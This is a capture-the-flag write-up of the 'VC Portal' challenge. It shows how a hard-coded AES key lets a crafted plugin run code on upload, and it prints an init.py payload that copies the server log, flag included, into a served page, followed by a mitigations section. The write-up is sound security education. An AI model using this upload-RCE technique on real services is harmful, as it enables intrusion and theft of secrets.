# VC Portal — Writeup (Markdown)

![Proof](proof.png)

**Author:** `stancium`   
**Solve:** 61

---

## Description

The VC Portal accepts plugin uploads as `.plugin` files. A `.plugin` is an AES-CBC encrypted ZIP (`iv || ciphertext`). On upload the server decrypts the file, extracts it, and **executes `init.py`** from the extracted directory. The application logs `init.py` stdout to `/opt/app/app.log`.

The supplied `flag.plugin` does **not** contain the flag directly; instead its `init.py` prints the flag from the environment variable `FLAG` and the server records that output in `app.log`.

Goal: recover the flag.

---

## Vulnerabilities

* **Arbitrary Code Execution:** Uploaded `init.py` is executed with `subprocess.run([...], cwd=plugin_dir)` with no sandboxing.
* **Hard-coded symmetric key:** `KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"` allows anyone to craft valid `.plugin` packages.
* **Log exposure vector:** Flag is printed to stdout by the official plugin and captured in `/opt/app/app.log`.
* **Store gating by plugin count:** Downloading from `/store` is gated by `len(registry) > 2`, which can be trivially reached by uploading benign plugins.

---

## Exploit Overview

1. Build a valid `.plugin` archive (zip), place an `init.py` that reads `/opt/app/app.log` and writes it into the plugin's own `index.html`.
2. Encrypt the zip using the known AES-CBC key (prepend a random IV), producing a `.plugin` file.
3. Upload the `.plugin` to the portal. The server will decrypt, extract, and execute `init.py`.
4. Visit `/widget/<your-uid>` — the server will serve the `index.html` you created, which contains the contents of the server log, including the flag line.
5. Parse the flag from the served page (it appears as `You cannot see this MUHAHAHAHA: <FLAG>` in the log).

---

## Tools & Helpers

* `rce_log_grab.py` — builds & uploads the plugin, fetches the widget page, and searches for flags.
  Path: `sandbox:/mnt/data/rce_log_grab.py`

* `decrypt_store_plugin.py` — helper to decrypt an encrypted `.plugin` (iv||ct) and extract it locally.
  Path: `sandbox:/mnt/data/decrypt_store_plugin.py`

* `proof.png` — a small proof image used in this writeup.
  Path: `sandbox:/mnt/data/proof.png`

> **Requirements:** `pip install requests pycryptodome`

---

## rce\_log\_grab.py (core exploit)

```py
# rce_log_grab.py - high level
# - crafts a zip containing plugin_manifest.json, thumbnail.svg, index.html, init.py
# - encrypts the zip with AES-CBC using the known key (iv||ciphertext)
# - uploads to /upload
# - finds the plugin UID on the dashboard
# - fetches /widget/<uid> and searches for flag patterns
```

Key snippet for `init.py` used inside the plugin:

```py
# init.py (what we execute on the server)
import html
from pathlib import Path
p = Path(__file__).resolve().parent
data = Path('/opt/app/app.log').read_text(errors='ignore')
(p / 'index.html').write_text('<!doctype html><meta charset="utf-8"><title>log</title><pre>' + html.escape(data) + '</pre>')
print('ok')
```

---

## Example run

1. Run the exploit script:

```bash
python3 rce_log_grab.py
```

2. The script saves the widget page to `widget_log.html`. Search for the flag:

```bash
grep -Eo 'CTF\{[^}]+\}|UPT\{[^}]+\}' widget_log.html || grep -n 'MUHAHAHAHA:' widget_log.html
```

Typical log line to look for:

```
plugin_stdout uid=<...> out=You cannot see this MUHAHAHAHA: CTF{...}
```

Submit the token inside `CTF{...}`.

---

## Why symlinks initially failed

We attempted to create a symlink entry in the ZIP where `index.html` pointed at `/opt/app/app.log`, hoping Flask would follow it. On this server, `zipfile.extractall` produced a regular file containing the symlink text instead of a real symlink pointing to the log, so the symlink approach returned the literal path string rather than the log contents. The RCE `init.py` approach is reliable because the server *always* executes `init.py`.

---

## Mitigations

* **Do not execute** arbitrary uploaded code. If execution is required, run it in a hardened sandbox: unprivileged user, no network, syscall filtering (seccomp), CPU/memory/time caps, and read-only filesystem mounts except a controlled working directory.
* **Use signatures, not symmetric encryption** in the upload flow. Sign plugin zips with Ed25519; verify on server before extracting. Never embed static keys in source code.
* **Sanitize ZIP entries:** refuse absolute paths, `..` components, and symlink entries. Ensure extracted files remain within the intended plugin directory.
* **Avoid logging secrets** to common logs or, at minimum, rotate and restrict log access.

---

## Appendix — Files

* `rce_log_grab.py` — exploit script.
* `decrypt_store_plugin.py` — decrypt helper.
* `proof.png` — small proof image used above.

---

## Notes / Credit

* Challenge: **VC Portal** — CTF\@AC
* Author of this writeup: `stancium`
* Techniques: AES format reversing, untrusted upload RCE, log exfiltration.
